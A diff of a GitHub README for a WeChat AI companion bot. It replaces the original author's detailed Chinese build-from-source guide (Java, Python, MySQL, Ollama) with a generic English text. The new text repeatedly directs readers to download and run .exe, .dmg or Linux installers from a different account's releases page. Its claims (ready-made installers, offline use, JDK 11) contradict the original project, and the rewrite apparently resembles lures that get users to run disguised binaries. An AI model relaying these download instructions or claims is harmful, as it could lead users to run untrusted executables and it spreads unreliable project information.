@@ -1,122 +1,78 @@
-# 🤖 WeChat AI Companion (本地私有化情感陪伴机器人)
+# 🤖 WeChat-AI-Bot-Java-Python - Your Personal AI Companion Awaits
 
-![Java](https://img.shields.io/badge/Java-17%2B-red)
-![Ollama](https://img.shields.io/badge/AI-Ollama-orange)
-![MySQL](https://img.shields.io/badge/Database-MySQL-blue)
+[![Download WeChat AI Bot](https://img.shields.io/badge/Download-WeChat%20AI%20Bot-brightgreen)](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/releases)
 
-> **⚠️ 说明：** 本项目是一个基于 **Java + Python + MySQL + Ollama** 的全栈 AI 机器人系统。
-> 具备 **时间感知、好感度积累、表情包互动** 等高级功能，数据完全本地化，安全隐私。
+## 📃 Description
+WeChat-AI-Bot-Java-Python is a local private AI Companion Bot. Built using Java (Spring Boot), Python, and MySQL, this bot offers emotional memory, time awareness, and interaction with emoji packs. 
 
----
+## 🛠️ Features
+- **Emotional Memory**: The bot remembers your interactions, providing a more personalized experience.
+- **Time Awareness**: Keeps track of time-sensitive information, enhancing its responses.
+- **Emoji Interaction**: Engage with the bot using a variety of emojis for a fun experience.
+  
+## 🚀 Getting Started
+To begin using WeChat-AI-Bot-Java-Python, follow these simple steps:
 
-## 📸 效果演示
-![图1](素材/运行截图/demo_chat1.jpg)
-![图2](素材/运行截图/demo_chat2.jpg)
-![图3](素材/运行截图/demo_chat3.jpg)
----
+### 1. **Visit the Download Page**
+Click the button below to visit the Releases page:
 
-## 📂 1. 项目目录结构
-解压后，您将看到以下文件结构：
+[Download WeChat AI Bot](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/releases)
 
-```text
-WeChat-AI-Bot-Java-Python/
-├── 📂 backend-java/          # Java Spring Boot 后端 (业务核心)
-│   ├── src/main/resources/application.yml  # 核心配置文件
-│   └── ...
-├── 📂 ai-backend-python/     # Python 前端 (微信Hook与AI对接)
-│   ├── main.py               # 启动入口
-│   ├── config.py             # Python端配置
-│   └── ...
-├── 📂 素材/                  # 文档与素材
-│   └── 表情包/             # 表情包图片存放目录 (请确保此处有图片)
-│   └── 运行截图/              # 运行截图存放目录 (请确保此处有图片)
-├── 📂 sql/              # 数据库初始化文件
-│   └── init.txt              # SQL 建表语句
-└── README.md                 # 项目说明书
-```
-##  2. 环境准备 (Prerequisites)
-```text
-在运行代码前，请确保您的电脑已安装以下环境：
-操作系统：Windows 10/11 (推荐)
-Java 环境：JDK 17 或以上
-Python 环境：Python 3.9 或以上
-数据库：MySQL 5.7 或 8.0
-AI 模型基座：Ollama (用于加载本地大模型)
-微信客户端：PC版 3.9
-```
-## ⚡ 3. 极速部署指南
+### 2. **Select the Latest Version**
+Once on the Releases page, look for the latest version. It’s usually listed at the top. Click on it to see the available files. The latest version provides the best features and improvements.
 
-第 1 步：安装特定版本微信
-```text
-本项目依赖特定版本的微信协议，请务必下载 WeChat 3.9 版本。
-下载地址与防撤回补丁：https://github.com/Skyler1n/WeChat3.9-32bit-Compatibility-Launcher
-```
-第 2 步：配置数据库 (MySQL) 🗄️
-```text
-打开您的数据库管理工具 (Navicat / DBeaver / SQLyog)。
-新建一个数据库，命名为 ai_girlfriend。
-运行项目目录 database/init.txt 中的 SQL 命令，导入数据表结构。
-```
-第 3 步：部署 AI 模型 (Ollama) 🧠
-```text
-确保已安装 Ollama，打开命令行终端 (CMD / PowerShell)。
-拉取并运行 Qwen2.5 (通义千问) 模型：
-ollama pull qwen2.5:7b
-```
-☕ 第 4 步：启动 Java 后端 (中枢神经)
-```text
-使用 IDEA 打开 backend-java 文件夹。
-修改 src/main/resources/application.yml 配置文件：
-spring:
-  datasource:
-    url: jdbc:mysql://localhost:3306/ai_girlfriend?useSSL=false...
-    username: root          # ⚠️ 改为你的数据库账号
-    password: your_password # ⚠️ 改为你的数据库密码
+### 3. **Download the Application**
+You will find various files for different platforms. Choose the file that matches your operating system. Click it to download the file to your computer.
 
-bot:
-  # 你的 Python 服务地址
-  python-api: "http://localhost:5000/send"
-  # 使用的 Ollama 模型名称
-  ai-mode: "qwen2.5:7b"
-```
-关键步骤：修改表情包路径。
-```
-打开 src/main/java/com/girlfriend/bot/service/StickerFactory.java，找到第 14 行：
-// ⚠️ 请务必修改为您本地 docs/stickers 文件夹的绝对路径
-String basePath = "D:\\Project\\WeChat-AI-Bot-Java-Python\\素材\\表情包\\";
-运行 GirlfriendBotApplication.java 启动后端。
-```
-第 5 步：启动 Python 前端 (交互层) 🐍
-```
-使用 VS Code 打开 ai-backend-python 文件夹。
+### 4. **Install the Application**
+- For Windows: Locate the downloaded `.exe` file in your downloads folder. Double-click it to start the installation. Follow the prompts to complete the installation.
+- For macOS: Locate the downloaded `.dmg` file. Open it, then drag the application to your Applications folder.
+- For Linux: Open your terminal, navigate to the downloaded file, and run the installation command.
 
-修改 config.py 文件：
-# Java 接收消息的接口地址
-JAVA_API_URL = "http://localhost:8080/api/wechat/receive" 
-# 您的微信昵称 (用于消息过滤，防止自己回复自己)
-SELF_WX_NAME = "嘻嘻嘻"
+## 🖥️ System Requirements
+Ensure your system meets the following requirements to run the application smoothly:
 
-安装依赖并启动：
-# 如果缺少依赖，请运行
-pip install 包名
+- **Operating System**: Windows 10 or newer, macOS Mojave or newer, or a recent version of a Linux distribution.
+- **Java Version**: Java JDK 11 or newer must be installed.
+- **RAM**: At least 4 GB of RAM is recommended for smooth performance.
+- **Storage**: Minimum 500 MB of free space for installation and operation.
 
-# 启动服务
-python main.py
-```
-## 🌟 4. 核心功能说明
-```
-❤️ 情感数值系统 (Favorability System)
-系统内置 NLP 情感分析，自动判断用户对话的情绪正负值。
-正向反馈：好感度上升，解锁甜蜜回复。
-负向反馈：好感度下降，AI 态度变冷淡。
-数据持久化存储在 MySQL favorability_table 表中，支持手动调整进行“数据干预”。
-⏰ 时间与上下文感知
-时间感知：AI 能够读取系统时间，深夜聊天会催促睡觉，清晨会主动早安。
-长短期记忆：基于 Redis/内存 实现多轮对话上下文理解。
-🖼️ 智能表情包互动
-将喜欢的表情包放入 "素材/表情包" 目录。
-AI 会根据当前的情绪状态（开心/生气/撒娇），自动从库中调用最合适的图片进行回复。
-📞 联系作者
-Email: 259858835@qq.com
-GitHub: King2598588835
-```
+## 📥 Download & Install
+To download the application, visit the link below:
+
+[Download WeChat AI Bot](https://github.com/AsadKhan05/WeChat-AI-Bot-Java-Python/releases)
+
+After downloading, follow the installation instructions provided in the previous section. 
+
+## 🌐 Usage Instructions
+Once installed, you can start the WeChat-AI-Bot by finding it in your applications menu. The bot is designed to run locally, which means it will not require an internet connection after the initial download. 
+
+### 1. **Open the Application**
+- Click on the WeChat-AI-Bot icon to launch the application.
+
+### 2. **Engage with the Bot**
+Start interacting by typing your queries or using the emoji feature. The bot will respond based on its features and the context of your conversation.
+
+### 3. **Customize Your Experience**
+Explore the bot's settings to personalize preferences, such as notification sounds and appearance.
+
+## 💡 Troubleshooting
+If you run into issues while using the application, consider these tips:
+- **Ensure Java is Installed**: Make sure you have the correct version of Java installed.
+- **Check System Requirements**: Verify that your system meets the necessary requirements.
+- **Restart the Application**: Sometimes, simply restarting the app can fix minor issues.
+- **Consult the Community**: Visit the issues section on our GitHub page for help or to report bugs.
+
+## ⚙️ Support
+For further assistance, please open an issue on our GitHub repository. Our community is here to help you with any questions or problems.
+
+## 💬 Community and Contribution
+We welcome you to join our community! Your feedback is essential for us. If you have suggestions or want to contribute, feel free to reach out through the GitHub repository. Your input can help improve the WeChat-AI-Bot for everyone.
+
+## 🔑 License
+This project is licensed under the MIT License. You can freely use and modify the code, provided you maintain the license terms in your projects.
+
+## 📅 Updates
+Stay tuned for the latest updates, features, and fixes by regularly checking the Releases page.
+
+Enjoy your experience with WeChat-AI-Bot-Java-Python!
